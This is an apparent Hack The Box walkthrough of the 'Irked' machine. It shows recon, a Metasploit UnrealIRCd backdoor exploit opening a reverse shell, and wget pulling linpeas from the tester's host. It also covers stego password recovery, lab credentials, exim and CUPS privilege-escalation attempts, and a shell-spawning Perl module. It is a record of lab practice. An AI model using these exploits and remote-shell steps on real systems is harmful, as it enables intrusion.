# [07 - Irked](https://app.hackthebox.com/machines/Irked)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [80](#80)
    * [6697](#6697)
    * [ircd](#ircd)
    * [djmardov](#djmardov)
    * [over the line](#over-the-line)
  * [flag](#flag)
![Irked.png](Irked.png)

## description
> 10.10.10.117

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- irked.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-24 07:34 MDT
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.058s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34435/tcp   status
|   100024  1          51905/udp6  status
|   100024  1          55936/udp   status
|_  100024  1          60129/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
34435/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80

> IRC is almost working

![irked.jpg](irked.jpg)

given the nmap scan showing that IRC is running, not sure web is going to give us much more.

```
/.hta                 (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 72]
/manual               (Status: 301) [Size: 307] [--> http://irked.htb/manual/]
/server-status        (Status: 403) [Size: 297]
```

separate note - consider creating a gobuster alias that always `-r` and `-f`

### 6697

it's been ... a while since connecting to irc. irssi?

```
07:41 -!- Irssi v1.2.2-2ubuntu1 - https://irssi.org
07:42 -!- Irssi: Unknown command: server irked.htb
07:42 -!- Irssi: Looking up irked.htb
07:42 -!- Irssi: Connecting to irked.htb [10.10.10.117] port 6697
07:42 -!- Irssi: Connection to irked.htb established
07:42 !irked.htb *** Looking up your hostname...
07:42 !irked.htb *** Couldn't resolve your hostname; using your IP address instead
07:42 -!- You have not registered
07:42 -!- Welcome to the ROXnet IRC Network conor!conor@10.10.14.9
07:42 -!- Your host is irked.htb, running version Unreal3.2.8.1
07:42 -!- This server was created Mon May 14 2018 at 13:12:50 EDT
07:42 -!- irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
07:42 -!- UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this      server
07:42 -!- WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr
          ELIST=MNUCT STATUSMSG=~&@%+ are supported by this server
07:42 -!- EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported by this server
07:42 -!- There are 1 users and 0 invisible on 1 servers
07:42 -!- 1 unknown connection(s)
07:42 -!- I have 1 clients and 0 servers
07:42 -!- Current Local Users: 1  Max: 1
07:42 -!- Current Global Users: 1  Max: 1
07:42 -!- MOTD File is missing
07:42 -!- Mode change [+iwx] for user conor
```

```
msf6 > search unrealircd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
```

we have a match.

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP handler on 10.10.14.9:4444
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.14.9:4444 -> 10.10.10.117:49196) at 2022-07-24 07:46:30 -0600

id -a
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

### ircd

```
pwd
/home/ircd/Unreal3.2
ls -la /home
total 16
drwxr-xr-x  4 root     root     4096 May 14  2018 .
drwxr-xr-x 21 root     root     4096 May 15  2018 ..
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 djmardov
drwxr-xr-x  3 ircd     root     4096 May 15  2018 ircd

ls -la /home/ircd
total 20
drwxr-xr-x  3 ircd root 4096 May 15  2018 .
drwxr-xr-x  4 root root 4096 May 14  2018 ..
-rw-------  1 ircd ircd  333 May 15  2018 .bash_history
-rw-r--r--  1 ircd ircd    0 May 14  2018 .bashrc
-rw-r--r--  1 ircd ircd   66 May 14  2018 .selected_editor
drwx------ 13 ircd ircd 4096 Jul 24 09:33 Unreal3.2
cat /home/ircd/.bash_history
ls
cat aliases
lskeys
ls keys
ls keys/CVS
cd keys
ls
file CVS
cd CVS
ls
ls Root
cat Root/Root
cd Root
ls
file Root
cat Root
cd /
ls
cd /home
ls
cd djmardov
ls
ls *
cd /tmp
ls
clear
clear
ls
cd /
ls
cd /var/www/html
ls
cd /tmp
sudo -i
cd /home/ircd
clear
ls
ls -lah
cd ..
ls
cd djmardov
ls
cd Documents
ls -lah
cat .backup
clear
exit
```

interesting usually see that `.bash_history` is symlinked to `/dev/null`
going to need to pop djmardov on the way up

```
ls -la /home/djmardov
total 92
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 .
drwxr-xr-x  4 root     root     4096 May 14  2018 ..
lrwxrwxrwx  1 root     root        9 Nov  3  2018 .bash_history -> /dev/null
-rw-r--r--  1 djmardov djmardov  220 May 11  2018 .bash_logout
-rw-r--r--  1 djmardov djmardov 3515 May 11  2018 .bashrc
drwx------ 13 djmardov djmardov 4096 May 15  2018 .cache
drwx------ 15 djmardov djmardov 4096 May 15  2018 .config
drwx------  3 djmardov djmardov 4096 May 11  2018 .dbus
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Desktop
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 Documents
drwxr-xr-x  2 djmardov djmardov 4096 May 14  2018 Downloads
drwx------  3 djmardov djmardov 4096 Nov  3  2018 .gconf
drwx------  2 djmardov djmardov 4096 May 15  2018 .gnupg
-rw-------  1 djmardov djmardov 4706 Nov  3  2018 .ICEauthority
drwx------  3 djmardov djmardov 4096 May 11  2018 .local
drwx------  4 djmardov djmardov 4096 May 11  2018 .mozilla
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Music
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Pictures
-rw-r--r--  1 djmardov djmardov  675 May 11  2018 .profile
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Public
drwx------  2 djmardov djmardov 4096 May 11  2018 .ssh
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Templates
drwxr-xr-x  2 djmardov djmardov 4096 May 11  2018 Videos
```

... but no `user.txt`?

```
find / -iname user.txt -type f 2>/dev/null
/home/djmardov/Documents/user.txt
ls -la /home/djmardov/Documents
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
```

ok, `user.txt` is there, but not readable by us.. though `.backup` is

```
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

`steg` not `ssh` password..

time for linpeas

```
wget http://10.10.14.9:8000/linpeas.sh -O /tmp/linpeas.sh
which wget
/usr/bin/wget
wget http://10.10.14.9:8000
wget http://10.10.14.9:8000 2>&1
--2022-07-24 10:04:36--  http://10.10.14.9:8000/
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 559 [text/html]
Saving to: ‘index.html’

     0K                                                       100%  126M=0s

2022-07-24 10:04:36 (126 MB/s) - ‘index.html’ saved [559/559]

wget http://10.10.14.9:8000/linpeas.sh -O /tmp/linpeas.sh 2>&1
--2022-07-24 10:04:55--  http://10.10.14.9:8000/linpeas.sh
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776967 (759K) [text/x-sh]
Saving to: ‘/tmp/linpeas.sh’

     0K .......... .......... .......... .......... ..........  6%  410K 2s
    50K .......... .......... .......... .......... .......... 13%  836K 1s
   100K .......... .......... .......... .......... .......... 19% 5.95M 1s
   150K .......... .......... .......... .......... .......... 26% 1.15M 1s
   200K .......... .......... .......... .......... .......... 32% 3.63M 1s
   250K .......... .......... .......... .......... .......... 39%  369K 1s
   300K .......... .......... .......... .......... .......... 46% 1.47M 0s
   350K .......... .......... .......... .......... .......... 52% 3.02M 0s
   400K .......... .......... .......... .......... .......... 59% 9.70M 0s
   450K .......... .......... .......... .......... .......... 65% 1.61M 0s
   500K .......... .......... .......... .......... .......... 72%  528K 0s
   550K .......... .......... .......... .......... .......... 79% 18.0M 0s
   600K .......... .......... .......... .......... .......... 85% 2.40M 0s
   650K .......... .......... .......... .......... .......... 92% 2.64M 0s
   700K .......... .......... .......... .......... .......... 98% 13.9M 0s
   750K ........                                              100% 73.7M=0.6s

2022-07-24 10:04:56 (1.22 MB/s) - ‘/tmp/linpeas.sh’ saved [776967/776967]
```

another issue in a busted shell where same command fails unless we redirect STDOUT and STDERR

```

                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
irked
127.0.0.1       localhost
127.0.1.1       irked.irked.htb irked

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
search mi.army.mil
nameserver 10.10.10.2
irked.htb


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:65534           0.0.0.0:*               LISTEN      677/ircd
tcp        0      0 0.0.0.0:8067            0.0.0.0:*               LISTEN      677/ircd
tcp        0      0 0.0.0.0:34435           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      677/ircd
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
tcp6       0      0 :::60129                :::*                    LISTEN      -
tcp6       0      0 :::111                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

...

╔══════════╣ Users with console
djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
ircd:x:1001:1001::/home/ircd:/bin/sh
root:x:0:0:root:/root:/bin/bash
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
```

```
ping -c 5 10.10.10.2
PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.
64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.144 ms
64 bytes from 10.10.10.2: icmp_seq=2 ttl=64 time=0.358 ms
64 bytes from 10.10.10.2: icmp_seq=3 ttl=64 time=0.283 ms
64 bytes from 10.10.10.2: icmp_seq=4 ttl=64 time=0.228 ms
64 bytes from 10.10.10.2: icmp_seq=5 ttl=64 time=0.164 ms

--- 10.10.10.2 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 3997ms
rtt min/avg/max/mdev = 0.144/0.235/0.358/0.079 ms
```

hrmm..

looking at `/home/ircd/Unreal3.2/` contents, starting with `unrealircd.conf`:

```
...

admin {
        "Bob Smith";
        "bob";
        "widely@used.name";
};
...

/* Passworded allow line */
allow {
        ip             *@255.255.255.255;
        hostname       *@*.passworded.ugly.people;
        class           clients;
        password "f00Ness";
        maxperip 1;
};

...
oper bobsmith {
        class           clients;
        from {
                userhost bob@smithco.com;
        };
        password "f00";
        flags
        {
                netadmin;
                can_zline;
                can_gzline;
                can_gkline;
                global;
        };
};

...
link            hub.mynet.com
{
        username        *;
        hostname        1.2.3.4;
        bind-ip         *;
        port            7029;
        hub             *;
        password-connect "LiNk";
        password-receive "LiNk";
        class           servers;
                options {
                        /* Note: You should not use autoconnect when linking services */
                        autoconnect;
//                      ssl;
//                      zip;
                };
...

 * drpass {
 *  restart             "(password for restarting)";
 *  die                 "(password for die)";
 * };
 */
drpass {
        restart "I-love-to-restart";
        die "die-you-stupid";
};

...

vhost {
        vhost           i.hate.microsefrs.com;
        from {
                userhost       *@*.image.dk;
        };
        login           stskeeps;
        password        moocowsrulemyworld;
};

...
set {
        kline-address "djmardov@irked.htb";
        modes-on-connect "+ixw";
        modes-on-oper    "+xwgs";
        oper-auto-join "#opers";
        options {
                hide-ulines;
                /* You can enable ident checking here if you want */
                /* identd-check; */
                show-connect-info;
        };
```

```
ls -laR /home/ircd/Unreal3.2/keys
/home/ircd/Unreal3.2/keys:
total 16
drwx------  3 ircd ircd 4096 Apr 13  2009 .
drwx------ 13 ircd ircd 4096 Jul 24 10:04 ..
drwx------  2 ircd ircd 4096 Apr 13  2009 CVS
-rw-------  1 ircd ircd    2 Apr 24  2004 .KEYS

/home/ircd/Unreal3.2/keys/CVS:
total 24
drwx------ 2 ircd ircd 4096 Apr 13  2009 .
drwx------ 3 ircd ircd 4096 Apr 13  2009 ..
-rw------- 1 ircd ircd   51 Apr 13  2009 Entries
-rw------- 1 ircd ircd   12 Apr 13  2009 Repository
-rw------- 1 ircd ircd   43 Apr 13  2009 Root
-rw------- 1 ircd ircd    8 Apr 13  2009 Tag
cat /home/ircd/Unreal3.2/keys/CVS/Root
:pserver:anonymous@cvs.unrealircd.com:/cvs
```

tried the few passwords we see as SSH for djmardov - no success.

still looking for a backup of some sort

... or is that actually the stego password for [irked.jpg](irked.jpg)?

```
$ stegseek --crack irked.jpg wl.txt
StegSeek version 0.5
Progress: 0.00% (0 bytes)

[i] --> Found passphrase: "UPupDOWNdownLRlrBAbaSSss"
[i] Original filename: "pass.txt"
[i] Extracting to "irked.jpg.out"
$ cat irked.jpg.out
Kab6h+m+bbp2J:HG
$ ssh -l djmardov irked.htb
Warning: Permanently added 'irked.htb,10.10.10.117' (ECDSA) to the list of known hosts.
djmardov@irked.htb's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$
djmardov@irked:~$ cat Documents/user.txt
4a66a78b12dc0e661a59d3f5c0267a8e
```

awww yeah.

### djmardov

```
djmardov@irked:~$ sudo -l
-bash: sudo: command not found
djmardov@irked:~$ crontab -l
no crontab for djmardov
```

linpeas from this side.. thinking cups

```
djmardov@irked:~$ apt-cache policy cups
cups:
  Installed: 1.7.5-11+deb8u2
  Candidate: 1.7.5-11+deb8u2
  Version table:
 *** 1.7.5-11+deb8u2 0
        500 http://ftp.us.debian.org/debian/ jessie/main i386 Packages
        100 /var/lib/dpkg/status
     1.7.5-11+deb8u1 0
        500 http://security.debian.org/ jessie/updates/main i386 Packages

```

some vulnerabilities, but at least [https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py](https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py) requires an actual printer on the other end, which there is not here.

however, looking at `ps aux` see:
```
root       573  0.0  0.0   2048    64 ?        Ss   09:33   0:00 /usr/sbin/minissdpd -i 0.0.0.0
Debian-+   927  0.0  0.1   9932  3236 ?        Ss   09:33   0:00 /usr/sbin/exim4 -bd -q30m
```

```
djmardov@irked:~$ apt-cache policy exim4
exim4:
  Installed: 4.84.2-2+deb8u5
  Candidate: 4.84.2-2+deb8u5
  Version table:
 *** 4.84.2-2+deb8u5 0
        500 http://security.debian.org/ jessie/updates/main i386 Packages
        100 /var/lib/dpkg/status
     4.84.2-2+deb8u4 0
        500 http://ftp.us.debian.org/debian/ jessie/main i386 Packages
```

which feels like [https://www.exploit-db.com/exploits/40054](https://www.exploit-db.com/exploits/40054)

but [https://www.exploit-db.com/exploits/39535](https://www.exploit-db.com/exploits/39535) seems a bit easier to run

```
djmardov@irked:~$ vi foo.sh
djmardov@irked:~$ bash foo.sh
[ CVE-2016-1531 local root exploit
foo.sh: line 23: /usr/exim/bin/exim: No such file or directory
djmardov@irked:~$ which exim
djmardov@irked:~$ find / -iname 'exim' -type f 2>/dev/null
djmardov@irked:~$ find / -iname 'exim4' -type f 2>/dev/null
/usr/sbin/exim4
/etc/init.d/exim4
/etc/default/exim4
/etc/ppp/ip-up.d/exim4
djmardov@irked:~$ ls /root
ls: cannot open directory /root: Permission denied
djmardov@irked:~$ ls /tmp
linpeas.sh  systemd-private-2f18808a4a5544caa6a8cfa348cb5829-colord.service-umXrtX  systemd-private-2f18808a4a5544caa6a8cfa348cb5829-rtkit-daemon.service-E6oMV0
root.pm     systemd-private-2f18808a4a5544caa6a8cfa348cb5829-cups.service-gUQEoH    vmware-root
djmardov@irked:~$ cat /tmp/root.pm
package root;
use strict;
use warnings;

system("/bin/sh");
djmardov@irked:~$ PERL5IB=/tmp PERL5OPT=-Mroot /usr/sbin/exim4 -ps
Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,
not directly from a shell command line. Options and/or arguments control
what it does when called. For a list of options, see the Exim documentation.
djmardov@irked:~$
```
but it's not exactly right.

```
djmardov@irked:~$ ls -l /usr/sbin/exim*
lrwxrwxrwx 1 root root       5 Feb 10  2018 /usr/sbin/exim -> exim4
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwxr-xr-x 1 root root    4649 Feb 10  2018 /usr/sbin/exim_checkaccess
-rwxr-xr-x 1 root root   74243 Feb 10  2018 /usr/sbin/exim_convert4r4
-rwxr-xr-x 1 root root   13644 Feb 10  2018 /usr/sbin/exim_dbmbuild
-rwxr-xr-x 1 root root   17748 Feb 10  2018 /usr/sbin/exim_dumpdb
-rwxr-xr-x 1 root root   21844 Feb 10  2018 /usr/sbin/exim_fixdb
-rwxr-xr-x 1 root root   17732 Feb 10  2018 /usr/sbin/exim_lock
-rwxr-xr-x 1 root root  151015 Feb 10  2018 /usr/sbin/eximstats
-rwxr-xr-x 1 root root   17748 Feb 10  2018 /usr/sbin/exim_tidydb
```

looking around elsewhere
```
djmardov@irked:~$ file /usr/share/ppd/custom
/usr/share/ppd/custom: setgid, sticky, directory
djmardov@irked:~$ ls -l /usr/share/ppd/custom/
total 0
djmardov@irked:~$ ls -ld /usr/share/ppd/custom/
drwxrwsr-t 2 root lpadmin 4096 Jul 23  2017 /usr/share/ppd/custom/
```

trying some suggested exploits from linpeas
```
  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230
```

nothing

```
djmardov@irked:~$ mail
No mail for djmardov
djmardov@irked:~$ mail djmardov@irked.htb
Subject: this is a test
of the emergency broadcast system

.
Cc:
djmardov@irked:~$
djmardov@irked:~$ mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/djmardov": 1 message 1 new
>N  1 Mailer-Daemon@irk  Sun Jul 24 16:15   39/1354  Mail delivery failed: returning message to sender
& 1
Message 1:
From MAILER-DAEMON Sun Jul 24 16:15:40 2022
Envelope-to: djmardov@irked.irked.htb
Delivery-date: Sun, 24 Jul 2022 16:15:40 -0400
X-Failed-Recipients: djmardov@irked.htb
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@irked.irked.htb>
To: djmardov@irked.irked.htb
Subject: Mail delivery failed: returning message to sender
Date: Sun, 24 Jul 2022 16:15:40 -0400

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  djmardov@irked.htb
    Mailing to remote domains not supported

------ This is a copy of the message, including all the headers. ------

Return-path: <djmardov@irked.irked.htb>
Received: from djmardov by irked with local (Exim 4.84_2)
        (envelope-from <djmardov@irked.irked.htb>)
        id 1oFi0q-0006mX-Rj
        for djmardov@irked.htb; Sun, 24 Jul 2022 16:15:40 -0400
To: djmardov@irked.htb
Subject: this is a test
Message-Id: <E1oFi0q-0006mX-Rj@irked>
From: djmardov <djmardov@irked.irked.htb>
Date: Sun, 24 Jul 2022 16:15:40 -0400

of the emergency broadcast system

```

but

```
djmardov@irked:~$ mail djmardov
Subject: foo
bar baz

.
Cc:
djmardov@irked:~$
djmardov@irked:~$ mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/djmardov": 1 message 1 new
>N  1 djmardov@irked.ir  Sun Jul 24 16:16   17/537   foo
& 1
Message 1:
From djmardov@irked.irked.htb Sun Jul 24 16:16:26 2022
Envelope-to: djmardov@irked.irked.htb
Delivery-date: Sun, 24 Jul 2022 16:16:26 -0400
To: djmardov@irked.irked.htb
Subject: foo
From: djmardov <djmardov@irked.irked.htb>
Date: Sun, 24 Jul 2022 16:16:26 -0400

bar baz
```

second time we've seen `irked.irked.htb` - but what is the relevance?

doesn't seem to be a vhost, since we get the same content

the cups exploit we were attempting needs a printer - why don't we just add one ourselves?
```
djmardov@irked:~$ /usr/sbin/lpadmin -p foo -E -v /dev/foo
lpadmin: File device URIs have been disabled. To enable, see the FileDevice directive in "/etc/cups/cups-files.conf".
djmardov@irked:~$ ls -l /etc/cups/cups-files.conf
-rw-r--r-- 1 root root 2970 Jul 23  2017 /etc/cups/cups-files.conf
```

ok.. that makes it a little harder

```
djmardov@irked:~$ /usr/sbin/lpadmin -p foo -E -v socket://10.1.1.1
djmardov@irked:~$ /usr/sbin/lpinfo -l
djmardov@irked:~$
```

and no error, but also no printer listed

let's set a ppd profile (at random):
```
djmardov@irked:~$ /usr/sbin/lpadmin -p foo -E -v socket://10.1.1.1 -P /usr/share/ppd/hp-ppd/HP/HP_Business_Inkjet_2500C_Series.ppd
djmardov@irked:~$ echo $?
0
djmardov@irked:~$ /usr/sbin/lpinfo -l
```

ok still no printers listed, but ec=0 is a good sign.

running the exploit again
```
djmardov@irked:~$ python 41233.py  -a localhost -b 631 -f

             lol ty google
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
              @0x00string
https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py

[*]     locate available printer
[+]     printer found: /printers/foo
[*]     stomp ACL
[*]     stomping ACL
[*]     >:
50 4f 53 54 20 2f 70 72 69 6e 74 65 72 73 2f 66         P O S T   / p r i n t e r s / f
6f 6f 20 48 54 54 50 2f 31 2e 31 0d 0a 43 6f 6e         o o   H T T P / 1 . 1 . . C o n
74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c 69         t e n t - T y p e :   a p p l i
63 61 74 69 6f 6e 2f 69 70 70 0d 0a 48 6f 73 74         c a t i o n / i p p . . H o s t
3a 20 6c 6f 63 61 6c 68 6f 73 74 3a 36 33 31 0d         :   l o c a l h o s t : 6 3 1 .
0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 43 55 50         . U s e r - A g e n t :   C U P
53 2f 32 2e 30 2e 32 0d 0a 43 6f 6e 6e 65 63 74         S / 2 . 0 . 2 . . C o n n e c t
69 6f 6e 3a 20 43 6c 6f 73 65 0d 0a 43 6f 6e 74         i o n :   C l o s e . . C o n t
65 6e 74 2d 4c 65 6e 67 74 68 3a 20 34 33 30 0d         e n t - L e n g t h :   4 3 0 .
0a 0d 0a 02 00 00 05 00 00 00 30 01 47 00 12 61         . . . . . . . . . . 0 . G . . a
74 74 72 69 62 75 74 65 73 2d 63 68 61 72 73 65         t t r i b u t e s - c h a r s e
...

[+]     ACL stomp successful
[*]     fin
```

it did find the printer, and whatever ACL it's talking about got stomped - sounds like this will win.

in help, points at `x86reverseshell.so`

built one in [stolen.c](stolen.c), and kicked - but did not see the file.

```

[*]     job id: 5
[*]     grab original config
[*]     grabbing configuration file....
[*]     config:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Unauthorized - CUPS v1.7.5</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Unauthorized</H1>
<P>Enter your username and password or the root username and password to access this page. If you are using Kerberos authentication, make sure you have a valid Kerberos ticket.</P>
</BODY>
</HTML>
```

but don't see username/password being passed

```
djmardov@irked:~$ wget http://localhost:631/admin/conf/cupsd.conf
--2022-07-24 17:27:40--  http://localhost:631/admin/conf/cupsd.conf
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:631... connected.
HTTP request sent, awaiting response... 401 Unauthorized

Username/Password Authentication Failed.
djmardov@irked:~$ wget --http-user djmardov --http-password=Kab6h+m+bbp2J:HG http://localhost:631/admin/conf/cupsd.conf
--2022-07-24 17:28:34--  http://localhost:631/admin/conf/cupsd.conf
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:631... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Connecting to localhost (localhost)|::1|:631... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4499 (4.4K) [text/plain]
Saving to: ‘cupsd.conf’

cupsd.conf                                      100%[=======================================================================================================>]   4.39K  --.-KB/s   in 0s

2022-07-24 17:28:34 (28.4 MB/s) - ‘cupsd.conf’ saved [4499/4499]
```

ok, modify the script to pass a Authorization header?

tried it in [41233.py](41233.py), but no luck, same auth failure.. which feels wrong

this is very similar to the root pivot in [Antique](https://github.com/chorankates/ctf/tree/master/hackthebox.eu/machines/15-Antique), can we leverage that work?

```
djmardov@irked:~$ vi poc3.sh
djmardov@irked:~$ bash poc3.sh
poc3.sh: line 10: curl: command not found
```

right, no curl here

and after struggling with python for a bit -- and finding out there is no `requests` module.. the cups version of Antique that is vulnerable.. is not what we're running here.


```
djmardov@irked:~$ cat .cache/.mc_connections
/org/freedesktop/Telepathy/Connection/idle/irc/djmardov_40localhost0x8ea91f0    :1.78   idle/irc/djmardov0
```

```
djmardov@irked:~$ export PATH=$PATH:/usr/sbin
djmardov@irked:~$ which lpadmin
/usr/sbin/lpadmin
```
much better.


### over the line

looking at the machine page, see that `SUID exploitation` is a tag, and we haven't plumbed that yet.

from linpeas:
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-- 1 root messagebus 355K Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9.3K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 550K Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary)
-rwsr-xr-x 1 root root 1.1M Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 332K Apr 14  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 94K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 18K Sep  8  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
